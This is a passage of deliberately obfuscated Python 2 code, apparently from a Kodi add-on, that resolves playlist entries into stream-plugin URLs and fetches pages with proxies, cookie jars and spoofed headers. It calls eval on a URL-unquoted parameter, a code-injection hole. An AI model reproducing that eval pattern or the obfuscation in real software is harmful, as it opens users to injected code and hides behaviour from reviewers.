      oo0oOo . append ( OOO00 . string )
   elif len ( O0O0Oooo0o ( 'lonk' ) ) > 0 :
    if 98 - 98: O00ooooo00 / o00O0oo
    if 32 - 32: oO0o0ooO0 * IIii1I / o0000oOoOoO0o
    for OOO00 in O0O0Oooo0o ( 'lonk' ) :
     if not OOO00 . string == None :
      oo0oOo . append ( OOO00 . string )
      if 38 - 38: i11Ii11I1Ii1i % iIiiiI1IiI1I1 % o00O0oo / Ooo00oOo00o + OOooOOo / O00ooooo00
   elif len ( O0O0Oooo0o ( 'sportsdevil' ) ) > 0 :
    for OOO00 in O0O0Oooo0o ( 'sportsdevil' ) :
     if not OOO00 . string == None :
      OoOOo0OOoO = 'plugin://plugin.video.SportsDevil/?mode=1&amp;item=catcher%3dstreams%26url=' + OOO00 . string
      ooO0O00Oo0o = O0O0Oooo0o ( 'referer' ) [ 0 ] . string
      if ooO0O00Oo0o :
       if 65 - 65: OoOO . o00O0oo - o0oO0 * O0oO / o0oO0 / i11Ii11I1Ii1i
       OoOOo0OOoO = OoOOo0OOoO + '%26referer=' + ooO0O00Oo0o
      oo0oOo . append ( OoOOo0OOoO )
   elif len ( O0O0Oooo0o ( 'p2p' ) ) > 0 :
    for OOO00 in O0O0Oooo0o ( 'p2p' ) :
     if not OOO00 . string == None :
      if 'sop://' in OOO00 . string :
       i111iIi1i1II1 = 'plugin://plugin.video.p2p-streams/?mode=2url=' + OOO00 . string + '&' + 'name=' + IiI1
       oo0oOo . append ( i111iIi1i1II1 )
      else :
       oooO = 'plugin://plugin.video.p2p-streams/?mode=1&url=' + OOO00 . string + '&' + 'name=' + IiI1
       oo0oOo . append ( oooO )
   elif len ( O0O0Oooo0o ( 'vaughn' ) ) > 0 :
    for OOO00 in O0O0Oooo0o ( 'vaughn' ) :
     if not OOO00 . string == None :
      i1I1i111Ii = 'plugin://plugin.stream.vaughnlive.tv/?mode=PlayLiveStream&amp;channel=' + OOO00 . string
      oo0oOo . append ( i1I1i111Ii )
   elif len ( O0O0Oooo0o ( 'ilive' ) ) > 0 :
    for OOO00 in O0O0Oooo0o ( 'ilive' ) :
     if not OOO00 . string == None :
      if not 'http' in OOO00 . string :
       ooo = 'plugin://plugin.video.tbh.ilive/?url=http://www.streamlive.to/view/' + OOO00 . string + '&amp;link=99&amp;mode=iLivePlay'
      else :
       ooo = 'plugin://plugin.video.tbh.ilive/?url=' + OOO00 . string + '&amp;link=99&amp;mode=iLivePlay'
   elif len ( O0O0Oooo0o ( 'yt-dl' ) ) > 0 :
    for OOO00 in O0O0Oooo0o ( 'yt-dl' ) :
     if not OOO00 . string == None :
      i1i1iI1iiiI = OOO00 . string + '&mode=18'
      oo0oOo . append ( i1i1iI1iiiI )
   elif len ( O0O0Oooo0o ( 'dm' ) ) > 0 :
    for OOO00 in O0O0Oooo0o ( 'dm' ) :
     if not OOO00 . string == None :
      Ooo0oOooo0 = "plugin://plugin.video.dailymotion_com/?mode=playVideo&url=" + OOO00 . string
      oo0oOo . append ( Ooo0oOooo0 )
   elif len ( O0O0Oooo0o ( 'dmlive' ) ) > 0 :
    for OOO00 in O0O0Oooo0o ( 'dmlive' ) :
     if not OOO00 . string == None :
      Ooo0oOooo0 = "plugin://plugin.video.dailymotion_com/?mode=playLiveVideo&url=" + OOO00 . string
      oo0oOo . append ( Ooo0oOooo0 )
   elif len ( O0O0Oooo0o ( 'utube' ) ) > 0 :
    for OOO00 in O0O0Oooo0o ( 'utube' ) :
     if not OOO00 . string == None :
      if ' ' in OOO00 . string :
       oOOOoo00 = 'plugin://plugin.video.youtube/search/?q=' + urllib . quote_plus ( OOO00 . string )
       O0O00Oo = oOOOoo00
      elif len ( OOO00 . string ) == 11 :
       oOOOoo00 = 'plugin://plugin.video.youtube/play/?video_id=' + OOO00 . string
      elif ( OOO00 . string . startswith ( 'PL' ) and not '&order=' in OOO00 . string ) or OOO00 . string . startswith ( 'UU' ) :
       oOOOoo00 = 'plugin://plugin.video.youtube/play/?&order=default&playlist_id=' + OOO00 . string
      elif OOO00 . string . startswith ( 'PL' ) or OOO00 . string . startswith ( 'UU' ) :
       oOOOoo00 = 'plugin://plugin.video.youtube/play/?playlist_id=' + OOO00 . string
      elif OOO00 . string . startswith ( 'UC' ) and len ( OOO00 . string ) > 12 :
       oOOOoo00 = 'plugin://plugin.video.youtube/channel/' + OOO00 . string + '/'
       O0O00Oo = oOOOoo00
      elif not OOO00 . string . startswith ( 'UC' ) and not ( OOO00 . string . startswith ( 'PL' ) ) :
       oOOOoo00 = 'plugin://plugin.video.youtube/user/' + OOO00 . string + '/'
       O0O00Oo = oOOOoo00
     oo0oOo . append ( oOOOoo00 )
   elif len ( O0O0Oooo0o ( 'imdb' ) ) > 0 :
    for OOO00 in O0O0Oooo0o ( 'imdb' ) :
     if not OOO00 . string == None :
      if OOo . getSetting ( 'genesisorpulsar' ) == '0' :
       iiIiIIIiiI = 'plugin://plugin.video.genesis/?action=play&imdb=' + OOO00 . string
      else :
       iiIiIIIiiI = 'plugin://plugin.video.pulsar/movie/tt' + OOO00 . string + '/play'
      oo0oOo . append ( iiIiIIIiiI )
   elif len ( O0O0Oooo0o ( 'f4m' ) ) > 0 :
    for OOO00 in O0O0Oooo0o ( 'f4m' ) :
     if not OOO00 . string == None :
      if '.f4m' in OOO00 . string :
       iiI1IIIi = 'plugin://plugin.video.f4mTester/?url=' + urllib . quote_plus ( OOO00 . string )
      elif '.m3u8' in OOO00 . string :
       iiI1IIIi = 'plugin://plugin.video.f4mTester/?url=' + urllib . quote_plus ( OOO00 . string ) + '&amp;streamtype=HLS'
       if 47 - 47: IiIIi1I1Iiii % o00O0oo % i11iIiiIii - OOO0O0O0ooooo + i11Ii11I1Ii1i
      else :
       iiI1IIIi = 'plugin://plugin.video.f4mTester/?url=' + urllib . quote_plus ( OOO00 . string ) + '&amp;streamtype=SIMPLE'
     oo0oOo . append ( iiI1IIIi )
   elif len ( O0O0Oooo0o ( 'ftv' ) ) > 0 :
    for OOO00 in O0O0Oooo0o ( 'ftv' ) :
     if not OOO00 . string == None :
      ooO000OO0O00O = 'plugin://plugin.video.F.T.V/?name=' + urllib . quote ( IiI1 ) + '&url=' + OOO00 . string + '&mode=125&ch_fanart=na'
     oo0oOo . append ( ooO000OO0O00O )
   elif len ( O0O0Oooo0o ( 'urlsolve' ) ) > 0 :
    for OOO00 in O0O0Oooo0o ( 'urlsolve' ) :
     if not OOO00 . string == None :
      OOOoOO0o = OOO00 . string + '&mode=19'
      oo0oOo . append ( OOOoOO0o )
   if len ( oo0oOo ) < 1 :
    raise
  except :
   i1IIiiiii ( 'Error <link> element, Passing:' + IiI1 . encode ( 'utf-8' , 'ignore' ) )
   continue
  try :
   oOOoo00O00o = O0O0Oooo0o ( 'externallink' ) [ 0 ] . string
  except : pass
  if 1 - 1: iIiiiI1IiI1I1
  if oOOoo00O00o :
   O0oOo00o = [ oOOoo00O00o ]
   oOOoo00O00o = True
  else :
   oOOoo00O00o = False
  try :
   O0O00Oo = O0O0Oooo0o ( 'jsonrpc' ) [ 0 ] . string
  except : pass
  if O0O00Oo :
   if 81 - 81: O0oO % O00ooooo00 . IIii1I
   O0oOo00o = [ O0O00Oo ]
   if 4 - 4: i11iIiiIii % Ooo00oOo00o % O00ooooo00 / O0oO
   O0O00Oo = True
  else :
   O0O00Oo = False
  try :
   OOOOoOoo0O0O0 = O0O0Oooo0o ( 'thumbnail' ) [ 0 ] . string
   if OOOOoOoo0O0O0 == None :
    raise
  except :
   OOOOoOoo0O0O0 = ''
  try :
   if not O0O0Oooo0o ( 'fanart' ) :
    if OOo . getSetting ( 'use_thumb' ) == "true" :
     IIiIi1iI = OOOOoOoo0O0O0
    else :
     IIiIi1iI = fanart
   else :
    IIiIi1iI = O0O0Oooo0o ( 'fanart' ) [ 0 ] . string
   if IIiIi1iI == None :
    raise
  except :
   IIiIi1iI = fanart
  try :
   Iii111II = O0O0Oooo0o ( 'info' ) [ 0 ] . string
   if Iii111II == None :
    raise
  except :
   Iii111II = ''
   if 6 - 6: IIII / IIiIiII11i % o0000oOoOoO0o - IIiIiII11i
  try :
   Ooo0OO0oOO = O0O0Oooo0o ( 'genre' ) [ 0 ] . string
   if Ooo0OO0oOO == None :
    raise
  except :
   Ooo0OO0oOO = ''
   if 31 - 31: o0000oOoOoO0o
  try :
   iiii11I = O0O0Oooo0o ( 'date' ) [ 0 ] . string
   if iiii11I == None :
    raise
  except :
   iiii11I = ''
   if 23 - 23: o0oO0 . O0oO
  iiIIiiIi1Ii11 = None
  if O0O0Oooo0o ( 'regex' ) :
   try :
    OO0000o = O0O0Oooo0o ( 'regex' )
    iiIIiiIi1Ii11 = Oo0 ( OO0000o )
   except :
    pass
  try :
   if len ( oo0oOo ) > 1 :
    i1I1i1 = 0
    O0OoooO0 = [ ]
    for OOO00 in oo0oOo :
     if o0iI11I1II == "false" :
      i1I1i1 += 1
      iiOOooooO0Oo ( OOO00 , '%s) %s' % ( i1I1i1 , IiI1 . encode ( 'utf-8' , 'ignore' ) ) , OOOOoOoo0O0O0 , IIiIi1iI , Iii111II , Ooo0OO0oOO , iiii11I , True , O0OoooO0 , iiIIiiIi1Ii11 , o0OOOO00O0Oo )
     elif o0iI11I1II == "true" and Ii1I == 'true' :
      if iiIIiiIi1Ii11 :
       O0OoooO0 . append ( OOO00 + '&regexs=' + iiIIiiIi1Ii11 )
      elif any ( x in OOO00 for x in OO0o ) and OOO00 . startswith ( 'http' ) :
       O0OoooO0 . append ( OOO00 + '&mode=19' )
      else :
       O0OoooO0 . append ( OOO00 )
     else :
      O0OoooO0 . append ( OOO00 )
    if len ( O0OoooO0 ) > 1 :
     iiOOooooO0Oo ( '' , IiI1 , OOOOoOoo0O0O0 , IIiIi1iI , Iii111II , Ooo0OO0oOO , iiii11I , True , O0OoooO0 , iiIIiiIi1Ii11 , o0OOOO00O0Oo )
   else :
    if oOOoo00O00o :
     if not iiIIiiIi1Ii11 == None :
      IiIiiI ( IiI1 . encode ( 'utf-8' ) , O0oOo00o [ 0 ] . encode ( 'utf-8' ) , 1 , OOOOoOoo0O0O0 , fanart , Iii111II , Ooo0OO0oOO , iiii11I , None , '!!update' , iiIIiiIi1Ii11 , oo0oOo [ 0 ] . encode ( 'utf-8' ) )
      if 85 - 85: o00O0oo
     else :
      IiIiiI ( IiI1 . encode ( 'utf-8' ) , O0oOo00o [ 0 ] . encode ( 'utf-8' ) , 1 , OOOOoOoo0O0O0 , fanart , Iii111II , Ooo0OO0oOO , iiii11I , None , 'source' , None , None )
      if 20 - 20: OoOO0ooOOoo0O % O0oO
    elif O0O00Oo :
     IiIiiI ( IiI1 . encode ( 'utf-8' ) , O0oOo00o [ 0 ] , 53 , OOOOoOoo0O0O0 , fanart , Iii111II , Ooo0OO0oOO , iiii11I , None , 'source' )
     if 19 - 19: OoOO % O0oO + i11Ii11I1Ii1i / o0oO0 . i11Ii11I1Ii1i
    else :
     iiOOooooO0Oo ( oo0oOo [ 0 ] , IiI1 . encode ( 'utf-8' , 'ignore' ) , OOOOoOoo0O0O0 , IIiIi1iI , Iii111II , Ooo0OO0oOO , iiii11I , True , None , iiIIiiIi1Ii11 , o0OOOO00O0Oo )
     if 12 - 12: O00ooooo00 + O00ooooo00 - OoOO * IiIIi1I1Iiii % IiIIi1I1Iiii - iIiiiI1IiI1I1
  except :
   i1IIiiiii ( 'There was a problem adding item - ' + IiI1 . encode ( 'utf-8' , 'ignore' ) )
   if 52 - 52: i11Ii11I1Ii1i . IIII + o0oO0
def Oo0 ( reg_item ) :
 try :
  iiIIiiIi1Ii11 = { }
  for OOO00 in reg_item :
   iiIIiiIi1Ii11 [ OOO00 ( 'name' ) [ 0 ] . string ] = { }
   iiIIiiIi1Ii11 [ OOO00 ( 'name' ) [ 0 ] . string ] [ 'name' ] = OOO00 ( 'name' ) [ 0 ] . string
   if 38 - 38: O00ooooo00 - iIiiiI1IiI1I1 . o0oO0
   try :
    iiIIiiIi1Ii11 [ OOO00 ( 'name' ) [ 0 ] . string ] [ 'expres' ] = OOO00 ( 'expres' ) [ 0 ] . string
    if not iiIIiiIi1Ii11 [ OOO00 ( 'name' ) [ 0 ] . string ] [ 'expres' ] :
     iiIIiiIi1Ii11 [ OOO00 ( 'name' ) [ 0 ] . string ] [ 'expres' ] = ''
   except :
    i1IIiiiii ( "Regex: -- No Referer --" )
   iiIIiiIi1Ii11 [ OOO00 ( 'name' ) [ 0 ] . string ] [ 'page' ] = OOO00 ( 'page' ) [ 0 ] . string
   try :
    iiIIiiIi1Ii11 [ OOO00 ( 'name' ) [ 0 ] . string ] [ 'referer' ] = OOO00 ( 'referer' ) [ 0 ] . string
   except :
    i1IIiiiii ( "Regex: -- No Referer --" )
   try :
    iiIIiiIi1Ii11 [ OOO00 ( 'name' ) [ 0 ] . string ] [ 'connection' ] = OOO00 ( 'connection' ) [ 0 ] . string
   except :
    i1IIiiiii ( "Regex: -- No connection --" )
    if 58 - 58: IIiIiII11i . IIII + OOooOOo
   try :
    iiIIiiIi1Ii11 [ OOO00 ( 'name' ) [ 0 ] . string ] [ 'notplayable' ] = OOO00 ( 'notplayable' ) [ 0 ] . string
   except :
    i1IIiiiii ( "Regex: -- No notplayable --" )
    if 66 - 66: IIII / OoOO0ooOOoo0O * II1 + II1 % o00O0oo
   try :
    iiIIiiIi1Ii11 [ OOO00 ( 'name' ) [ 0 ] . string ] [ 'noredirect' ] = OOO00 ( 'noredirect' ) [ 0 ] . string
   except :
    i1IIiiiii ( "Regex: -- No noredirect --" )
   try :
    iiIIiiIi1Ii11 [ OOO00 ( 'name' ) [ 0 ] . string ] [ 'origin' ] = OOO00 ( 'origin' ) [ 0 ] . string
   except :
    i1IIiiiii ( "Regex: -- No origin --" )
   try :
    iiIIiiIi1Ii11 [ OOO00 ( 'name' ) [ 0 ] . string ] [ 'accept' ] = OOO00 ( 'accept' ) [ 0 ] . string
   except :
    i1IIiiiii ( "Regex: -- No accept --" )
   try :
    iiIIiiIi1Ii11 [ OOO00 ( 'name' ) [ 0 ] . string ] [ 'includeheaders' ] = OOO00 ( 'includeheaders' ) [ 0 ] . string
   except :
    i1IIiiiii ( "Regex: -- No includeheaders --" )
    if 49 - 49: OoOO0ooOOoo0O - i11iIiiIii . o0oO0 * oO0o0ooO0 % IIII + O00ooooo00
    if 71 - 71: ii11ii1ii
   try :
    iiIIiiIi1Ii11 [ OOO00 ( 'name' ) [ 0 ] . string ] [ 'listrepeat' ] = OOO00 ( 'listrepeat' ) [ 0 ] . string
    print 'listrepeat' , iiIIiiIi1Ii11 [ OOO00 ( 'name' ) [ 0 ] . string ] [ 'listrepeat' ] , OOO00 ( 'listrepeat' ) [ 0 ] . string , OOO00
   except :
    i1IIiiiii ( "Regex: -- No listrepeat --" )
    if 38 - 38: OoOO0ooOOoo0O % OOooOOo + OoOO . i11iIiiIii
    if 53 - 53: i11iIiiIii * IIII
    if 68 - 68: IIii1I * IIii1I . ii11ii1ii / iIiiiI1IiI1I1 % IiIIi1I1Iiii
   try :
    iiIIiiIi1Ii11 [ OOO00 ( 'name' ) [ 0 ] . string ] [ 'proxy' ] = OOO00 ( 'proxy' ) [ 0 ] . string
   except :
    i1IIiiiii ( "Regex: -- No proxy --" )
    if 38 - 38: i11Ii11I1Ii1i - o0000oOoOoO0o / IIII
   try :
    iiIIiiIi1Ii11 [ OOO00 ( 'name' ) [ 0 ] . string ] [ 'x-req' ] = OOO00 ( 'x-req' ) [ 0 ] . string
   except :
    i1IIiiiii ( "Regex: -- No x-req --" )
    if 66 - 66: OOO0O0O0ooooo % OoOO + i11iIiiIii . OOooOOo / oO0o0ooO0 + OoOO
   try :
    iiIIiiIi1Ii11 [ OOO00 ( 'name' ) [ 0 ] . string ] [ 'x-addr' ] = OOO00 ( 'x-addr' ) [ 0 ] . string
   except :
    i1IIiiiii ( "Regex: -- No x-addr --" )
    if 86 - 86: ii11ii1ii
   try :
    iiIIiiIi1Ii11 [ OOO00 ( 'name' ) [ 0 ] . string ] [ 'x-forward' ] = OOO00 ( 'x-forward' ) [ 0 ] . string
   except :
    i1IIiiiii ( "Regex: -- No x-forward --" )
    if 5 - 5: O0oO * OOooOOo
   try :
    iiIIiiIi1Ii11 [ OOO00 ( 'name' ) [ 0 ] . string ] [ 'agent' ] = OOO00 ( 'agent' ) [ 0 ] . string
   except :
    i1IIiiiii ( "Regex: -- No User Agent --" )
   try :
    iiIIiiIi1Ii11 [ OOO00 ( 'name' ) [ 0 ] . string ] [ 'post' ] = OOO00 ( 'post' ) [ 0 ] . string
   except :
    i1IIiiiii ( "Regex: -- Not a post" )
   try :
    iiIIiiIi1Ii11 [ OOO00 ( 'name' ) [ 0 ] . string ] [ 'rawpost' ] = OOO00 ( 'rawpost' ) [ 0 ] . string
   except :
    i1IIiiiii ( "Regex: -- Not a rawpost" )
   try :
    iiIIiiIi1Ii11 [ OOO00 ( 'name' ) [ 0 ] . string ] [ 'htmlunescape' ] = OOO00 ( 'htmlunescape' ) [ 0 ] . string
   except :
    i1IIiiiii ( "Regex: -- Not a htmlunescape" )
    if 5 - 5: o0oO0
    if 90 - 90: o0oO0 . i11Ii11I1Ii1i / oO0o0ooO0 - o00O0oo
   try :
    iiIIiiIi1Ii11 [ OOO00 ( 'name' ) [ 0 ] . string ] [ 'readcookieonly' ] = OOO00 ( 'readcookieonly' ) [ 0 ] . string
   except :
    i1IIiiiii ( "Regex: -- Not a readCookieOnly" )
    if 40 - 40: II1
   try :
    iiIIiiIi1Ii11 [ OOO00 ( 'name' ) [ 0 ] . string ] [ 'cookiejar' ] = OOO00 ( 'cookiejar' ) [ 0 ] . string
    if not iiIIiiIi1Ii11 [ OOO00 ( 'name' ) [ 0 ] . string ] [ 'cookiejar' ] :
     iiIIiiIi1Ii11 [ OOO00 ( 'name' ) [ 0 ] . string ] [ 'cookiejar' ] = ''
   except :
    i1IIiiiii ( "Regex: -- Not a cookieJar" )
   try :
    iiIIiiIi1Ii11 [ OOO00 ( 'name' ) [ 0 ] . string ] [ 'setcookie' ] = OOO00 ( 'setcookie' ) [ 0 ] . string
   except :
    i1IIiiiii ( "Regex: -- Not a setcookie" )
   try :
    iiIIiiIi1Ii11 [ OOO00 ( 'name' ) [ 0 ] . string ] [ 'appendcookie' ] = OOO00 ( 'appendcookie' ) [ 0 ] . string
   except :
    i1IIiiiii ( "Regex: -- Not a appendcookie" )
    if 25 - 25: O0oO + oO0o0ooO0 / i11Ii11I1Ii1i . ii11ii1ii % OOO0O0O0ooooo * Ooo00oOo00o
   try :
    iiIIiiIi1Ii11 [ OOO00 ( 'name' ) [ 0 ] . string ] [ 'ignorecache' ] = OOO00 ( 'ignorecache' ) [ 0 ] . string
   except :
    i1IIiiiii ( "Regex: -- no ignorecache" )
    if 84 - 84: i11Ii11I1Ii1i % oO0o0ooO0 + i11iIiiIii
    if 28 - 28: IiIIi1I1Iiii + Ooo00oOo00o * o0000oOoOoO0o % OoOO0ooOOoo0O . o00O0oo % OOO0O0O0ooooo
    if 16 - 16: o00O0oo - IIii1I / IIiIiII11i . iIiiiI1IiI1I1 + IIii1I
    if 19 - 19: Ooo00oOo00o - IiIIi1I1Iiii . OOO0O0O0ooooo
    if 60 - 60: iIiiiI1IiI1I1 + IiIIi1I1Iiii
  iiIIiiIi1Ii11 = urllib . quote ( repr ( iiIIiiIi1Ii11 ) )
  return iiIIiiIi1Ii11
  if 9 - 9: i11Ii11I1Ii1i * II1 - IIii1I + OOooOOo / Ooo00oOo00o . Ooo00oOo00o
 except :
  iiIIiiIi1Ii11 = None
  i1IIiiiii ( 'regex Error: ' + IiI1 . encode ( 'utf-8' , 'ignore' ) )
  if 49 - 49: iIiiiI1IiI1I1
def Iiii1iI1i ( url ) :
 try :
  for OOO00 in range ( 1 , 51 ) :
   I1ii1ii11i1I = o0OoOO ( url )
   if "EXT-X-STREAM-INF" in I1ii1ii11i1I : return url
   if not "EXTM3U" in I1ii1ii11i1I : return
   xbmc . sleep ( 2000 )
  return
 except :
  return
  if 55 - 55: i11Ii11I1Ii1i - o00O0oo + iIiiiI1IiI1I1 + IIII % oO0o0ooO0
def iiI11i1II ( regexs , url , cookieJar = None , forCookieJarOnly = False , recursiveCall = False , cachedPages = { } , rawPost = False , cookie_jar_file = None ) :
 if not recursiveCall :
  regexs = eval ( urllib . unquote ( regexs ) )
  if 51 - 51: ii11ii1ii % IiIIi1I1Iiii % ii11ii1ii * OOO0O0O0ooooo - o0000oOoOoO0o % IiIIi1I1Iiii
  if 65 - 65: i11Ii11I1Ii1i
 o0OooOOOOOO = re . compile ( '\$doregex\[([^\]]*)\]' ) . findall ( url )
 if 78 - 78: IIiIiII11i - IIii1I . i11Ii11I1Ii1i + IIii1I
 oOoOO = True
 for Ii1i1 in o0OooOOOOOO :
  if Ii1i1 in regexs :
   if 65 - 65: i11Ii11I1Ii1i . II1 / OoOO . O00ooooo00 * Ooo00oOo00o
   IiIiII1 = regexs [ Ii1i1 ]
   if 21 - 21: OOO0O0O0ooooo % O0oO . IIiIiII11i / iIiiiI1IiI1I1 + O0oO
   OOOO0O00o = False
   if 'cookiejar' in IiIiII1 :
    if 62 - 62: IIii1I
    OOOO0O00o = IiIiII1 [ 'cookiejar' ]
    if '$doregex' in OOOO0O00o :
     cookieJar = iiI11i1II ( regexs , IiIiII1 [ 'cookiejar' ] , cookieJar , True , True , cachedPages )
     OOOO0O00o = True
    else :
     OOOO0O00o = True
     if 12 - 12: o0000oOoOoO0o / ii11ii1ii
   if OOOO0O00o :
    if cookieJar == None :
     if 42 - 42: IiIIi1I1Iiii
     cookie_jar_file = None
     if 'open[' in IiIiII1 [ 'cookiejar' ] :
      cookie_jar_file = IiIiII1 [ 'cookiejar' ] . split ( 'open[' ) [ 1 ] . split ( ']' ) [ 0 ]
      if 19 - 19: OoOO0ooOOoo0O % OoOO * IIii1I + IIiIiII11i
     cookieJar = iii11I ( cookie_jar_file )
     if cookie_jar_file :
      I1Iii1 ( cookieJar , cookie_jar_file )
      if 30 - 30: II1 - OOooOOo
      if 75 - 75: IIii1I - oO0o0ooO0 . IiIIi1I1Iiii % i11iIiiIii % o00O0oo
      if 55 - 55: IIII . iIiiiI1IiI1I1 % Ooo00oOo00o * IIII + i11Ii11I1Ii1i + oO0o0ooO0
    elif 'save[' in IiIiII1 [ 'cookiejar' ] :
     cookie_jar_file = IiIiII1 [ 'cookiejar' ] . split ( 'save[' ) [ 1 ] . split ( ']' ) [ 0 ]
     II1Iiiiii = os . path . join ( Oooo0000 , cookie_jar_file )
     print 'complete_path' , II1Iiiiii
     I1Iii1 ( cookieJar , cookie_jar_file )
   if IiIiII1 [ 'page' ] and '$doregex' in IiIiII1 [ 'page' ] :
    IiIiII1 [ 'page' ] = iiI11i1II ( regexs , IiIiII1 [ 'page' ] , cookieJar , recursiveCall = True , cachedPages = cachedPages )
    if 36 - 36: IIiIiII11i - o00O0oo
   if 'setcookie' in IiIiII1 and IiIiII1 [ 'setcookie' ] and '$doregex' in IiIiII1 [ 'setcookie' ] :
    IiIiII1 [ 'setcookie' ] = iiI11i1II ( regexs , IiIiII1 [ 'setcookie' ] , cookieJar , recursiveCall = True , cachedPages = cachedPages )
   if 'appendcookie' in IiIiII1 and IiIiII1 [ 'appendcookie' ] and '$doregex' in IiIiII1 [ 'appendcookie' ] :
    IiIiII1 [ 'appendcookie' ] = iiI11i1II ( regexs , IiIiII1 [ 'appendcookie' ] , cookieJar , recursiveCall = True , cachedPages = cachedPages )
    if 29 - 29: i11Ii11I1Ii1i * o0000oOoOoO0o
    if 10 - 10: o0oO0 % O0oO * O0oO . o00O0oo / oO0o0ooO0 % o0000oOoOoO0o
   if 'post' in IiIiII1 and '$doregex' in IiIiII1 [ 'post' ] :
    IiIiII1 [ 'post' ] = iiI11i1II ( regexs , IiIiII1 [ 'post' ] , cookieJar , recursiveCall = True , cachedPages = cachedPages )
    print 'post is now' , IiIiII1 [ 'post' ]
    if 49 - 49: Ooo00oOo00o / OoOO0ooOOoo0O + OOO0O0O0ooooo * ii11ii1ii
   if 'rawpost' in IiIiII1 and '$doregex' in IiIiII1 [ 'rawpost' ] :
    IiIiII1 [ 'rawpost' ] = iiI11i1II ( regexs , IiIiII1 [ 'rawpost' ] , cookieJar , recursiveCall = True , cachedPages = cachedPages , rawPost = True )
    if 28 - 28: i11Ii11I1Ii1i + i11iIiiIii / o00O0oo % OOooOOo % IiIIi1I1Iiii - OOO0O0O0ooooo
    if 54 - 54: O00ooooo00 + iIiiiI1IiI1I1
   if 'rawpost' in IiIiII1 and '$epoctime$' in IiIiII1 [ 'rawpost' ] :
    IiIiII1 [ 'rawpost' ] = IiIiII1 [ 'rawpost' ] . replace ( '$epoctime$' , oOOO0oo0 ( ) )
    if 46 - 46: O0oO
   if 'rawpost' in IiIiII1 and '$epoctime2$' in IiIiII1 [ 'rawpost' ] :
    IiIiII1 [ 'rawpost' ] = IiIiII1 [ 'rawpost' ] . replace ( '$epoctime2$' , ii1iIi1iIiI1i ( ) )
    if 40 - 40: O00ooooo00 % o0000oOoOoO0o
    if 71 - 71: OOooOOo
   ii111IiiI1 = ''
   if IiIiII1 [ 'page' ] and IiIiII1 [ 'page' ] in cachedPages and not 'ignorecache' in IiIiII1 and forCookieJarOnly == False :
    ii111IiiI1 = cachedPages [ IiIiII1 [ 'page' ] ]
   else :
    if IiIiII1 [ 'page' ] and not IiIiII1 [ 'page' ] == '' and IiIiII1 [ 'page' ] . startswith ( 'http' ) :
     if '$epoctime$' in IiIiII1 [ 'page' ] :
      IiIiII1 [ 'page' ] = IiIiII1 [ 'page' ] . replace ( '$epoctime$' , oOOO0oo0 ( ) )
     if '$epoctime2$' in IiIiII1 [ 'page' ] :
      IiIiII1 [ 'page' ] = IiIiII1 [ 'page' ] . replace ( '$epoctime2$' , ii1iIi1iIiI1i ( ) )
      if 11 - 11: IIii1I * oO0o0ooO0
      if 76 - 76: i11Ii11I1Ii1i
     IIIiI11ii1I = IiIiII1 [ 'page' ] . split ( '|' )
     IiiiI = IIIiI11ii1I [ 0 ]
     O00OoOO0oo0 = None
     if len ( IIIiI11ii1I ) > 1 :
      O00OoOO0oo0 = IIIiI11ii1I [ 1 ]
      if 96 - 96: OOooOOo . ii11ii1ii - i11Ii11I1Ii1i
      if 99 - 99: O0oO . IiIIi1I1Iiii - oO0o0ooO0 % oO0o0ooO0 * OOO0O0O0ooooo . iIiiiI1IiI1I1
      if 4 - 4: oO0o0ooO0
      if 51 - 51: Ooo00oOo00o - OOO0O0O0ooooo % OoOO0ooOOoo0O - iIiiiI1IiI1I1
      if 31 - 31: IIII / IiIIi1I1Iiii - IIII - o0000oOoOoO0o
      if 7 - 7: IIII % OOO0O0O0ooooo . OOooOOo + IIiIiII11i - o00O0oo
      if 75 - 75: o00O0oo
      if 71 - 71: i11Ii11I1Ii1i
      if 53 - 53: II1 % oO0o0ooO0 . O0oO / i11iIiiIii % IIII
      if 28 - 28: o00O0oo
     oOOOOoo = urllib2 . ProxyHandler ( urllib2 . getproxies ( ) )
     if 58 - 58: ii11ii1ii / O0oO . OOooOOo / II1 + o0oO0
     if 86 - 86: o00O0oo * IIiIiII11i + o00O0oo + iIiiiI1IiI1I1
     if 8 - 8: o0oO0 - IIII / i11Ii11I1Ii1i
     IIiiIiI1 = urllib2 . Request ( IiiiI )
     if 'proxy' in IiIiII1 :
      oo0oOoo = IiIiII1 [ 'proxy' ]
      print 'proxytouse' , oo0oOoo
      if 57 - 57: OOooOOo - OoOO
      if IiiiI [ : 5 ] == "https" :
       I11i = urllib2 . ProxyHandler ( { 'https' : oo0oOoo } )
       if 1 - 1: IIiIiII11i / O0oO * i11Ii11I1Ii1i
      else :
       I11i = urllib2 . ProxyHandler ( { 'http' : oo0oOoo } )
       if 1 - 1: o00O0oo * ii11ii1ii . OOooOOo / OOO0O0O0ooooo
      O00 = urllib2 . build_opener ( I11i )
      urllib2 . install_opener ( O00 )
      if 52 - 52: i11Ii11I1Ii1i + OOO0O0O0ooooo . IIII . OoOO . Ooo00oOo00o
      if 97 - 97: IIiIiII11i / IIII
     IIiiIiI1 . add_header ( 'User-Agent' , 'Mozilla/5.0 (Windows NT 6.1; rv:14.0) Gecko/20100101 Firefox/14.0.1' )
     oo0oOoo = None
     if 71 - 71: iIiiiI1IiI1I1 / O00ooooo00 . OoOO % II1 . OOooOOo
     if 'referer' in IiIiII1 :
      IIiiIiI1 . add_header ( 'Referer' , IiIiII1 [ 'referer' ] )
     if 'accept' in IiIiII1 :
      IIiiIiI1 . add_header ( 'Accept' , IiIiII1 [ 'accept' ] )
     if 'agent' in IiIiII1 :
      IIiiIiI1 . add_header ( 'User-agent' , IiIiII1 [ 'agent' ] )
     if 'x-req' in IiIiII1 :
      IIiiIiI1 . add_header ( 'X-Requested-With' , IiIiII1 [ 'x-req' ] )
     if 'x-addr' in IiIiII1 :
      IIiiIiI1 . add_header ( 'x-addr' , IiIiII1 [ 'x-addr' ] )
     if 'x-forward' in IiIiII1 :
      IIiiIiI1 . add_header ( 'X-Forwarded-For' , IiIiII1 [ 'x-forward' ] )
     if 'setcookie' in IiIiII1 :
      print 'adding cookie' , IiIiII1 [ 'setcookie' ]
      IIiiIiI1 . add_header ( 'Cookie' , IiIiII1 [ 'setcookie' ] )
     if 'appendcookie' in IiIiII1 :
      print 'appending cookie to cookiejar' , IiIiII1 [ 'appendcookie' ]
      Iiiiii111i1ii = IiIiII1 [ 'appendcookie' ]
      Iiiiii111i1ii = Iiiiii111i1ii . split ( ';' )
      for i1i1iII1 in Iiiiii111i1ii :
       iii11i1IIII , Ii = i1i1iII1 . split ( '=' )
       o00 , iii11i1IIII = iii11i1IIII . split ( ':' )
